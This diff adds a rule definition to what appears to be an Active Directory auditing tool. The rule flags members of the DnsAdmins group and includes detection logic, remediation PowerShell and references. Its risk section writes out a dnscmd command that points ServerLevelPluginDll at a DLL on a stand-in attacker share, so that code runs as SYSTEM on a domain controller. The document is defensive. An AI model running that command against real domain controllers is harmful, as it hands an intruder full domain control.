@@ -1,0 +1,110 @@
+id = "AD-PRIV-004"
+aliases = ["dnsadmins"]
+summary = "DnsAdmins has members, and any of them can make the DNS service on a domain controller load an arbitrary DLL as SYSTEM."
+severities = ["medium"]
+severity_logic = """
+Always **medium**. The DLL is loaded only when the DNS service restarts, which DnsAdmins
+cannot trigger with the default service permissions (the `dnscmd /Restart` operation
+described by Semperis is the exception), but the outcome is code execution as SYSTEM on
+a DC.
+"""
+mitre = ["T1574.002"]
+data_sources = ["ldap"]
+attributes = ["memberOf (transitive) of the group with sAMAccountName DnsAdmins"]
+related = ["AD-PRIV-001", "AD-PRIV-008", "AD-PATH-001"]
+since = "0.1.0"
+
+risk = """
+The DNS server management protocol (MS-DNSP) has an operation that sets
+`ServerLevelPluginDll`, the path of a plugin DLL the DNS service loads at start. The
+path is not checked, so it can point to a share the attacker controls. Members of
+DnsAdmins may call it:
+
+```console
+dnscmd dc01.corp.example /config /serverlevelplugindll \\\\attacker\\share\\plugin.dll
+```
+
+When the DNS service on that domain controller next starts, it loads the DLL as
+`NT AUTHORITY\\SYSTEM`. SYSTEM on a DC is equivalent to Domain Admin: the attacker can
+read the directory database, add themselves to any group or plant persistence.
+
+In practice DnsAdmins is often given to network or help desk teams who manage DNS
+records, which turns their accounts into a path to tier 0.
+"""
+
+detection = """
+ad-doctor finds the group by `sAMAccountName = DnsAdmins` (a domain-local group created
+when the DNS server role is installed with AD-integrated DNS) and lists its
+**transitive** user and computer members. Any member is reported; the objects are the
+account names, for example `helpdesk`.
+
+The check looks only at membership. Read and write rights granted directly on the
+`MicrosoftDNS` container in the System container allow the same attack without the
+group; ad-doctor does not read that ACL, so review it by hand (remediation step 1).
+"""
+
+false_positives = """
+- **Dedicated DNS administrators** who are already treated as tier 0 (separate admin
+  accounts, privileged access workstations) are a deliberate choice. Accept the finding
+  for those accounts in an [accepted-risk file](../ci.md#accepted-risks).
+"""
+
+remediation = """
+1. **List the members and check that no plugin is configured.** Run the second command
+   on each domain controller that runs DNS; it only reads the value.
+
+    ```powershell
+    Get-ADGroupMember DnsAdmins -Recursive | Select-Object SamAccountName, objectClass
+    Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters' `
+        -Name ServerLevelPluginDll -ErrorAction SilentlyContinue
+    ```
+
+    A `ServerLevelPluginDll` value you did not configure is a sign of compromise. Also
+    look for principals other than the defaults with write access to the container:
+
+    ```powershell
+    $dns = "CN=MicrosoftDNS,CN=System,$((Get-ADDomain).DistinguishedName)"
+    (Get-Acl "AD:$dns").Access |
+        Where-Object ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteProperty|WriteDacl' |
+        Format-Table IdentityReference, ActiveDirectoryRights, IsInherited -AutoSize
+    ```
+
+2. **Empty the group** (the same command ad-doctor writes with `--fixes`):
+
+    ```powershell
+    Remove-ADGroupMember DnsAdmins -Members helpdesk -WhatIf
+    ```
+
+3. **Delegate record management instead.** People who create or change records need
+   rights on the DNS zones (the zone objects under `MicrosoftDNS`), not membership of
+   DnsAdmins, which manages the DNS *server*.
+
+4. **If the group must keep members, treat them as tier 0**: separate admin accounts,
+   privileged access workstations, the same monitoring as Domain Admins.
+
+5. **Detect use of the technique**: event 770 in the *DNS Server* log records the
+   plugin DLL loaded at service start, and event 5136 records changes to the
+   `MicrosoftDNS` container's security descriptor or to DnsAdmins.
+"""
+
+verify = "ad-doctor scan dc01.corp.example --ldaps -u 'CORP\\auditor' --only AD-PRIV-004"
+
+[[references]]
+title = "From DNSAdmins to Domain Admin (Sean Metcalf)"
+url = "https://adsecurity.org/?p=4064"
+kind = "research"
+
+[[references]]
+title = "DnsAdmins revisited (Semperis)"
+url = "https://www.semperis.com/blog/dnsadmins-revisited/"
+kind = "research"
+
+[[references]]
+title = "Active Directory security groups: DnsAdmins"
+url = "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins"
+kind = "vendor"
+
+[[references]]
+title = "ANSSI Active Directory checklist (vuln_dnsadmins)"
+url = "https://cert.cyber.gouv.fr/uploads/ad_checklist.html"
+kind = "vendor"
